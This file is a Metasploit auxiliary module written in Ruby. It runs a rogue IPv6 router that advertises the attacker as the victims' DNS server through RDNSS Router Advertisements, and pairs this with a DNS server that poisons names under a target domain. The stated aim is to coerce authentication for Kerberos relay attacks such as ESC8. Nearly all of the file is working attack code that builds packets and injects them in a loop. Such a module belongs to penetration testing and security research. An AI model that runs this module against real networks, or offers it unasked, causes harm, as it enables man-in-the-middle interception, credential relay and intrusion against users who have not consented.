##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Capture
  include Msf::Exploit::Remote::Ipv6
  include Msf::Exploit::Remote::DNS::Client
  include Msf::Exploit::Remote::DNS::Server
  include Msf::Exploit::Remote::DNS::NamePoisoner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'IPv6 Router Advertisement DNS Takeover (RDNSS IPv6 DNS coercion)',
        'Description' => %q{
          This module runs a rogue IPv6 router that advertises the attacker as the
          recursive DNS server (RDNSS, RFC 8106) inside periodic Router
          Advertisements, and a paired DNS server that poisons names under a target
          domain to point at the attacker while transparently forwarding all other
          lookups so the victim stays functional.

          It is the Router Advertisement equivalent of the mitm6 DHCPv6 DNS
          takeover: instead of answering DHCPv6 Solicits, it multicasts RAs
          carrying an RDNSS option, which modern Windows (and other RFC 8106
          clients) adopt as their IPv6 resolver. By default the RA does not claim
          to be a default router (router lifetime 0), so routing is left untouched
          and only DNS is taken over.

          Once a client resolves a target service through the attacker, it can be
          coerced into authenticating to the attacker. Paired with a Kerberos relay
          target (for example ESC8 AD CS web enrollment), this is a native coercion
          half of the Kerberos relay via DNS technique (CVE-2026-20929), removing
          the dependency on external tooling such as mitm6.

          IPv6 is preferred by Windows over IPv4, so becoming the client's IPv6 DNS
          server is enough to intercept its name resolution even on IPv4 networks.
          Layer 2 adjacency (same segment) and root privileges to inject raw
          packets are required.
        },
        'Author' => [
          'Pushpender Rathore' # native RA/RDNSS + DNS coercion
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-20929'],
          ['URL', 'https://www.rfc-editor.org/rfc/rfc8106'],
          ['URL', 'https://github.com/dirkjanm/mitm6'],
          ['ATT&CK', Mitre::Attack::Technique::T1557_ADVERSARY_IN_THE_MIDDLE]
        ],
        'Actions' => [
          [ 'Service', { 'Description' => 'Run the RA/RDNSS and DNS takeover services' } ]
        ],
        'PassiveActions' => [ 'Service' ],
        'DefaultAction' => 'Service',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    # TARGET_DOMAIN, TARGET_HOSTS, SPOOF_IP6 and RELAY_CNAME come from the shared
    # DNS::NamePoisoner mixin; INTERFACE/SMAC/SHOST come from the Ipv6 mixin.
    register_options(
      [
        OptInt.new('RA_INTERVAL', [ true, 'Seconds between unsolicited Router Advertisements.', 30 ]),
        OptBool.new('ADVERTISE_SEARCH_DOMAIN', [ true, 'Advertise TARGET_DOMAIN as a DNS search list (DNSSL) to steer short-name resolution.', true ]),
        OptBool.new('BECOME_ROUTER', [ true, 'Also advertise as the default router (router lifetime > 0). Off by default for a DNS-only takeover.', false ])
      ]
    )
  end

  def run
    validate_ipv6!(datastore['SPOOF_IP6'], 'SPOOF_IP6')
    check_pcaprub_loaded

    start_service
    print_status("DNS server started, poisoning names under #{datastore['TARGET_DOMAIN']} -> #{poison_description}")

    start_ra_advertiser
    print_status("Advertising #{datastore['SPOOF_IP6']} as the IPv6 DNS server via Router Advertisements every #{datastore['RA_INTERVAL']}s")

    service.wait if service
  rescue Rex::BindFailed => e
    print_error("Failed to bind the DNS service socket: #{e.message}")
  end

  def cleanup
    super
    @ra_thread&.kill
    @ra_thread = nil
    close_pcap if @ra_pcap_open
    @ra_pcap_open = false
  end

  private

  def start_ra_advertiser
    interface = datastore['INTERFACE'] || ipv6_interface

    smac = datastore['SMAC'].presence || begin
      get_mac(interface)
    rescue StandardError => e
      fail_with(Failure::BadConfig, "Cannot get MAC address for interface #{interface}: #{e}")
    end

    shost = datastore['SHOST'].presence || ipv6_link_address('INTERFACE' => interface)
    fail_with(Failure::BadConfig, "Could not determine a link-local source address for #{interface}; set SHOST") if shost.to_s.empty?

    domains = datastore['ADVERTISE_SEARCH_DOMAIN'] ? [datastore['TARGET_DOMAIN']] : []
    router_lifetime = datastore['BECOME_ROUTER'] ? 1800 : 0

    pkt = ipv6_build_ra_dns_packet(
      smac,
      [datastore['SPOOF_IP6']],
      shost: shost,
      domains: domains,
      router_lifetime: router_lifetime
    )

    begin
      open_pcap('INTERFACE' => interface, 'ARPCAP' => false)
    rescue StandardError => e
      fail_with(Failure::BadConfig, "Cannot open pcap on interface #{interface}: #{e}")
    end
    @ra_pcap_open = true

    @ra_thread = framework.threads.spawn('IPv6-RA-Advertiser', false) do
      loop do
        inject(pkt.to_s)
        Rex.sleep(datastore['RA_INTERVAL'].to_i)
      end
    end
  end
end
